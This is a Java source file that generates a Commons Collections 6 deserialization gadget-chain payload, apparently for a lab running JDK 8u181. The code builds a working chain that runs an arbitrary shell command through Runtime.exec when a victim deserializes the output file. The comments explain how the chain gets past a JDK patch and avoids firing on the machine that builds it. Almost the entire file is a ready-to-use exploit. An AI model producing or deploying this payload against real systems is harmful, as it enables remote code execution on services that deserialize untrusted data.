import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Hand-built CommonsCollections6 gadget chain (the classic ysoserial technique,
 * reimplemented directly rather than pulling the whole ysoserial framework).
 * Chosen over CC1 specifically because CC1 relies on
 * sun.reflect.annotation.AnnotationInvocationHandler behavior that the JDK
 * patched around 8u71 -- CC6 avoids that class entirely via HashSet/TiedMapEntry
 * and keeps working on later JDK8 builds (this lab targets 8u181).
 */
public class GenCC6 {
    public static void main(String[] args) throws Exception {
        String cmd = args.length > 0 ? args[0] : "id";
        String outFile = args.length > 1 ? args[1] : "payload.bin";

        Transformer[] realTransformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/sh", "-c", cmd}})
        };

        // Build with a harmless chain first so hashCode() calls during OUR OWN
        // construction don't fire the real payload on the machine generating it.
        Transformer[] fakeTransformers = new Transformer[]{ new ConstantTransformer(1) };
        ChainedTransformer chain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet<Object> set = new HashSet<Object>(1);
        set.add(entry);   // fires hashCode() -> harmless fake chain -> caches {"foo":1}

        // Undo the harmless caching so the map looks "empty" again from LazyMap's view.
        innerMap.remove("foo");

        // Now swap in the REAL, dangerous chain -- only fires when the VICTIM
        // deserializes this object and HashSet.readObject() recomputes hashCode().
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, realTransformers);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(set);
        oos.close();

        try (FileOutputStream fos = new FileOutputStream(outFile)) {
            fos.write(bos.toByteArray());
        }
        System.out.println("[+] CC6 gadget-chain payload written to " + outFile + " (" + bos.size() + " bytes), command=" + cmd);
    }
}
